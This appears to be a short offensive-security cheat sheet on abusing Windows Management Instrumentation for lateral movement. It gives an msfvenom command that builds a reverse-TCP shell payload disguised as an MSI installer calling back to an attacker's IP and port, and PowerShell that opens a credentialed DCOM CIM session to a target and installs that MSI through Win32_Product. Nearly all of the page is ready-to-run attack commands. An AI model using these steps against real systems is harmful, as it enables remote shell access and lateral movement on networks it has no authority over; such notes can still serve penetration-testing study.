---
title: WMI
---

:::danger Required Group Memberships: `Administrators`

:::

**`Windows Management Instrumentation` (WMI)** is Windows implementation of **Web-Based Enterprise Management (WBEM)**, an enterprise standard for accessing management Information across devices. **WMI** allows Administrators to perform Standard Management Tasks that Attackers can abuse to perform Lateral Movement.

<br/>

### Installing MSI Packages Through WMI

```batch
:: Remote Procedure Call
135/TCP 49152-65535/TCP (DCE/RPC)

:: WinRM 2.0 [HTTP]     WinRM 2.0 [HTTPS]
5985/TCP                5986/TCP
```

**`MSI`** is a file format used for Installers. If we can copy an **MSI Package** to the Target System, we can then use **WMI** to attempt to install it for us. Once the **MSI** file is in the Target System, we can attempt to Install it by invoking the **`Win32_Product`** class through WMI.

<br/>

```batch
:: PAYLOAD
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > INSTALLER.msi
```

```powershell
# Provide: [NAME - PASSWORD - TARGET]
$username = 'NAME';
$password = 'PASSWORD';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

```powershell
# Provide [INSTALLER.msi] Location
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\INSTALLER.msi"; Options = ""; AllUsers = $false}
```